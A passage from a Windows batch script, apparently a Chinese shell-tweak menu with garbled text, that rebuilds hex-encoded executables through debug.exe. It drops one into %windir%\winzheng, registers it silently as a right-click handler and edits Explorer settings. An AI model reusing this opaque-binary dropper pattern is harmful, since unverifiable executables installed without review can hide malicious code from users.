@echo +"8560FFFFFFD01B400089BD58FFFFFFBBA41A4000FFD68B9578FFFFFF8B857CFFFFFF83EC108BCC83EC1089118B55808941048B45848951088B9558FFFFFF89410C8B855CFFFFFF8BCC83EC1089118B9560FFFFFF8941048B8564FFFFFF8951088B953CFFFFFF89410C8BCCB8080000006A0389018B8544FFFFFF68B81A400089"_>>debug.vbs
@echo +"51048959088B1D4010400089410C8D4DA851FFD350FF158810400083C43C8D4DA8FF150C1040006A008D55A8686C1A400052C74580D01A400089BD78FFFFFFC78560FFFFFFD81B400089BD58FFFFFFFFD68B8D78FFFFFF8B957CFFFFFF83EC108BC483EC1089088B4D808950048B55848948088B8D58FFFFFF89500C8B955CFF"_>>debug.vbs
@echo +"FFFF8BC483EC1089088B8D60FFFFFF8950048B9564FFFFFF8948088BCC89500CB80800000089018B953CFFFFFFB8481B40008951046A0368B81A40008941088B8544FFFFFF89410C8D4DA851FFD350FF158810400083C43C8D4DA8FF150C104000C745805C1B400089BD78FFFFFFC78560FFFFFFD81B40006A008D55A8686C1A"_>>debug.vbs
@echo +"40005289BD58FFFFFFC78540FFFFFF481B4000FFD68B8D78FFFFFF8B957CFFFFFF83EC108BC483EC1089088B4D808950048B55848948088B8D58FFFFFF89500C8B955CFFFFFF8BC483EC1089088B8D60FFFFFF8950048B9564FFFFFF8948088BCC6A0368B81A400089500C8B953CFFFFFFB80800000089018B8540FFFFFF8951"_>>debug.vbs
@echo +"048B9544FFFFFF8941088D45A85089510CFFD350FF158810400083C43C8D4DA8FF150C1040006A008D4DA8686C1A400051C74580A01B400089BD78FFFFFFFFD68B8578FFFFFF8B8D7CFFFFFF83EC108BD46A0168B81B400089028B4580894A048B4D84894208894A0C8D55A852FFD350FF158810400083C41C8D4DA8FF150C10"_>>debug.vbs
@echo +"40008D45CC6A0050FF159810400033DBFF1514104000895DFC68D7234000EB218D4DB8FF15AC1040008D4D888D5598518D45A852506A03FF151010400083C410C38B350C1040008D4DDCFFD68D4DCCFFD68D4DBCFFD6C38B4508508B08FF51088B45FC8B4DEC5F5E64890D000000005B8BE55DC2040090909090909090909090"_>>debug.vbs
@echo +"9E9E9E9E2C240000FFFFFFFFFFFFFFFFE0240000001000000000000000000000000000000000000000000000EE240000F82400000625000016250000262500003A2500004625000056250000642500007A2500008A2500009C250000AE250000B8250000C6250000DA250000EA250000F82500000A260000182600002E260000"_>>debug.vbs
@echo +"38260000542600006A26000078260000CC0200808A2600009E260000A8260000BA260000CC260000DE26000064000080EC260000FA2600000E270000202700003027000048270000602700006A270000742700007E27000088270000000000004D535642564D36302E444C4C000000005F4349636F73000000005F61646A5F66"_>>debug.vbs
@echo +"7074616E000000005F5F7662615661724D6F7665000000005F5F76626146726565566172000000005F5F766261467265655661724C697374000000005F5F766261456E64000000005F61646A5F666469765F6D36340000005F61646A5F667072656D310000005F5F76626153657453797374656D4572726F720000005F61646A"_>>debug.vbs
@echo +"5F666469765F6D33320000005F61646A5F666469765F6D313669000000005F61646A5F66646976725F6D3136690000005F434973696E000000005F5F76626143686B73746B0000004556454E545F53494E4B5F4164645265660000005F5F76626156617254737445710000005F5F7662614F626A566172000000446C6C46756E"_>>debug.vbs
@echo +"6374696F6E43616C6C0000005F61646A5F66706174616E0000004556454E545F53494E4B5F52656C65617365000000005F4349737172740000004556454E545F53494E4B5F5175657279496E746572666163650000005F5F76626145786365707448616E646C6572000000005F61646A5F667072656D000000005F61646A5F66"_>>debug.vbs
@echo +"646976725F6D3634000000005F5F7662614650457863657074696F6E000000005F43496C6F67000000005F61646A5F666469765F6D333269000000005F61646A5F66646976725F6D3332690000005F61646A5F66646976725F6D3332000000005F61646A5F666469765F720000005F5F7662614934566172000000005F5F7662"_>>debug.vbs
@echo +"614C6174654D656D43616C6C000000005F5F766261537472546F416E7369000000005F5F766261566172436F7079000000005F5F7662615661724C6174654D656D43616C6C4C640000005F5F7662615661725365744F626A416464726566000000005F43496174616E0000005F616C6C6D756C0000005F434974616E00000000"_>>debug.vbs
@echo +"5F4349657870000000005F5F7662614672656553747200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"00000000B957B445220000000000030003000000580000800E00000040000080100000002800008000000000B957B4452200000000000100010000008000008000000000B957B4452200000000000100010000009800008000000000B957B445220000000000030031750000E000008032750000C800008033750000B0000080"_>>debug.vbs
@echo +"00000000B957B445220000000000010004080000F800000000000000B957B4452200000000000100000000000801000000000000B957B4452200000000000100000000001801000000000000B957B4452200000000000100000000002801000000000000B957B445220000000000010000000000380100005041000050020000"_>>debug.vbs
@echo +"B004000000000000A043000030000000B004000000000000D043000028010000B004000000000000F8440000E8020000B004000000000000E047000030010000B0040000000000000000000000000000500234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100"_>>debug.vbs
@echo +"0000010000000000000001000000000000000000000000000400000001000000000000000000000000000000440000000000560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000408B004B0010000010053007400720069006E00"_>>debug.vbs
@echo +"6700460069006C00650049006E0066006F0000008C010000010030003800300034003000340042003000000038001800010043006F006D00700061006E0079004E0061006D006500000000003E663A799096CF85F25DE5778765F64E6962555C0D54000030000C0001004C006500670061006C0043006F007000790072006900"_>>debug.vbs
@echo +"67006800740000000F5CD191E55D5C4FA45B0000280008000100500072006F0064007500630074004E0061006D00650000000000E55D0B7A310000002C000A000100460069006C006500560065007200730069006F006E000000000031002E00300030000000000030000A000100500072006F00640075006300740056006500"_>>debug.vbs
@echo +"7200730069006F006E00000031002E0030003000000000003C001A00010049006E007400650072006E0061006C004E0061006D00650000006B0075006F007A00680061006E0067006D0069006E006700000000004C00220001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006B007500"_>>debug.vbs
@echo +"6F007A00680061006E0067006D0069006E0067002E006500780065000000000000000100030020200200010001003001000031752020100001000400E8020000327510101000010004002801000033752800000010000000200000000100040000000000C0000000000000000000000000000000000000000000000000008000"_>>debug.vbs
@echo +"008000000080800080000000800080008080000080808000C0C0C0000000FF0000FF000000FFFF00FF000000FF00FF00FFFF0000FFFFFF000000000000000000000000000000000000000000000000000000000008F07700000008FFFFF07770000FFFFFFFF07000000FFFFFFFF00000000FFFFFFFF00000000FFFFF80000000"_>>debug.vbs
@echo +"000F80000EE0000000000EEEE0000000000EE000000000000000000000000000000000000000000000000000000000000000000000000000FFFF0000FFFF0000FF8F0000F8030000C0010000C0070000C00F0000C00F0000C00F0000C00F0000C00F0000C07F0000C7FF0000FFFF0000FFFF0000FFFF00002800000020000000"_>>debug.vbs
@echo +"40000000010004000000000080020000000000000000000000000000000000000000000000008000008000000080800080000000800080008080000080808000C0C0C0000000FF0000FF000000FFFF00FF000000FF00FF00FFFF0000FFFFFF000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008FFF0770000000000000000000008FFFFFFF07777000000000000008FFFFFFFFFFFF0777777000000000FFFFFFFFFFFFFFFF0777700000"_>>debug.vbs
@echo +"000000FFFFFFFFFFFFFFFF0770000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000"_>>debug.vbs
@echo +"000000FFFFFFFFFFFF88880000000000000000FFFFFFFF888800000000000000000000FFFF88880000EEEE000000000000000088880000EEEE000000000000000000000000EEEE000000000000000000000000EEEE00000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC1FFFFFC007FFF80001F"_>>debug.vbs
@echo +"F8000007F800001FF800007FF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF8003FFFF803FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF2800000020000000400000000100010000000000000100000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000FFFFFF00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC1FFFFFC3C7FFFC3FC1FF83FFC07FBFFFC1FFBFFFC7FFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFC1FFFBFC3DFFFBC3C1FFF83C3FFFFBC3FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC1FFFFFC007FFFC0001FF8000007F800001FF800007FF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF8003FFFF803FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"">>debug.vbs
@echo with wscript.stdout:r=vbcrlf:for i=1 to len(str) step 48:.write "e"+hex(256+(i-1)/2):for j=i to i+46 step 2:.write " "+mid(str,j,2):next:.write r:next>>debug.vbs
@echo .write "rbx"+r+"0"+r+"rcx"+r+"5000"+r+"n debug.tmp"+r+"w"+r+"q"+r:end with>>debug.vbs&&cscript //nologo debug.vbs|debug.exe>nul&&ren debug.tmp "kuozhangming.exe"&del debug.vbs
md %windir%\winzheng\
copy kuozhangming.exe %windir%\winzheng\
del kuozhangming.exe
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\AllFilesystemObjects\shell\HideFileExt]>>SHOWALL.reg
ECHO @="��ʾ��֪�ļ���չ��">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\AllFilesystemObjects\shell\HideFileExt\Command]>>SHOWALL.reg
ECHO @="C:\\WINDOWS\\winzheng\\kuozhangming.exe">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Folder\shell\HideFileExt]>>SHOWALL.reg
ECHO @="������֪�ļ���չ��">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Folder\shell\HideFileExt\Command]>>SHOWALL.reg
ECHO @="C:\\WINDOWS\\winzheng\\kuozhangming.exe">>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg

exit
rem �������������������������������
goto 7
:list1_3a
MODE con: COLS=50 LINES=15
color 1f
cls
del /s /q %windir%\SuperHidden.vbs
del /s /q %windir%\winzheng\kuozhangming.exe
cls
reg delete "HKCR\Directory\Background\shellex\ContextMenuHandlers\SuperHidden" /f
reg delete "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\InProcServer32" /f
reg delete "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance" /f
reg delete "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag" /f
reg delete "HKCR\AllFilesystemObjects\shell\HideFileExt" /f
reg delete "HKCR\Folder\shell\HideFileExt" /f

ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>SHOWALL.reg
ECHO "ShowSuperHidden"=dword:00000001>>SHOWALL.reg
ECHO "Hidden"=dword:00000001>>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo.
echo.
echo.
echo.
echo              ��ʾ/������չ��ɾ���ɹ�!
echo.
echo.
echo                   �����������!
pause>nul
goto list7_7
rem �������������������������������
goto 8
:list8_8
MODE con: COLS=50 LINES=15
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\*\shellex\ContextMenuHandlers\{645FF040-5081-101B-9F08-00AA002F954E}]>>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo                ��ջ���վ��ӳɹ�!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 8
:list8_8a
MODE con: COLS=50 LINES=15
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [-HKEY_CLASSES_ROOT\*\shellex\ContextMenuHandlers\{645FF040-5081-101B-9F08-00AA002F954E}]>>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo                ��ջ���վɾ���ɹ�!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 9
:list9_9
MODE con: COLS=50 LINES=17
color 5f
cls
echo         �q�������������������������������r
echo   �q������        ��  ��  ��  ��        �������r
echo   ��    �t�������������������������������s    ��
echo   ��                                          ��
echo   ��  1���Ҽ���ӹرչ���                     ��
echo   ��                                          ��
echo   ��  2���Ҽ���Ӵ򿪹���                     ��
echo   ��                                          ��
echo   ��  0�������ϲ�˵�                         ��
echo   ��                                          ��
echo   ��  e���˳�                                 ��
echo   ��                                          ��
echo   �� ��ҳ�������ֺ��a��Ϊȡ������,��1a��2a�� ��
echo   �t�������������������������������������������s
set /p list2=  ������ѡ��:
if "%list2%"=="1" goto list1_1
if "%list2%"=="1a" goto list1_1a
if "%list2%"=="2" goto list1_2
if "%list2%"=="2a" goto list1_2a
if "%list2%"=="0" goto startfjcyz
if "%list2%"=="e" goto exit
goto 9
rem �������������������������������
rem �������������������������������
rem �������������������������������
goto 9
:list1_1
MODE con: COLS=50 LINES=15
color 4f
cls
echo.
echo.��������DLL�ļ���,��ɺ��Զ��˳�����,���Ժ�...
@echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
@echo +"504500004C0105008ADB1E3C0000000000000000E0000E210B010414002A00000018000000000000981000000010000000400000000000110010000000020000040000000100010004000000000000000080000000040000A0B600000200000000001000001000000000100000100000000000001000000090370000A1000000"_>>debug.vbs
@echo +"0050000028000000006000002C0A000000000000000000000000000000000000007000005803000000000000000000000000000000000000000000000000000000000000000000000000000000000000400200002000000090500000680000000000000000000000000000000000000000000000000000002E74657874000000"_>>debug.vbs
@echo +"3128000000100000002A000000040000000000000000000000000000200000602E64617461000000D8040000004000000000000000000000000000000000000000000000400000C02E69646174610000C40100000050000000020000002E0000000000000000000000000000400000402E727372630000002C0A000000600000"_>>debug.vbs
@echo +"000C000000300000000000000000000000000000400000402E72656C6F630000780300000070000000040000003C000000000000000000000000000040000042153551381000000000000000000000004D535642564D35302E444C4C000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"FF25B0500011FF25D0500011FF25D8500011FF25C4500011FF25F0500011FF25C0500011FF2594500011FF25CC500011FF2598500011FF25A8500011FF25A0500011FF25AC500011FF25BC500011FF25C8500011FF25B8500011FF25A4500011FF25B4500011FF25D4500011FF259C500011FF2590500011FF25DC500011FF25"_>>debug.vbs
@echo +"E8500011FF25E4500011FF25E0500011FF25EC50001100005A68D044001168D444001152E9E7FFFFFF0000004800000030000000400000000000000089D3FA873D5D4A4396E0492F0FFE018C000000000000020000002727272727274344524F4D456A656374007074696F6E004578706C696369000000008800000000000000"_>>debug.vbs
@echo +"0200000000000000439947F01DAADD4986F46035E068260C01000000900000000000000000000000000000000010000073202247634D656E7500696F6FC8C97CC07BC342BDF718EE7DDCFEEE010001009418001100000000FFFFFFFFFFFFFFFF0000000018190011144000110C00000068E8190004002000000000000C551800"_>>debug.vbs
@echo +"84110011201D00119C1E0011501A0011E41E0011BAF4260011B94E100011FFE1BA042E0011B94E100011FFE156423521DF107662356368732E646C6C000000002A0000000000000000000000000005000408000000000000000000008813001100F0300000FFFFFF010000000100000000000000E90000004C1100114C110011"_>>debug.vbs
@echo +"AC100011680000006D000000780000007900000073726364004344524F4D456A65637400004344524F4D456A65637400070000002822001107000000EC21001107000000A8210011070000006C210011070000002C21001107000000EC200011070000009C20001107000000881F0011070000004C1F001107000000101F0011"_>>debug.vbs
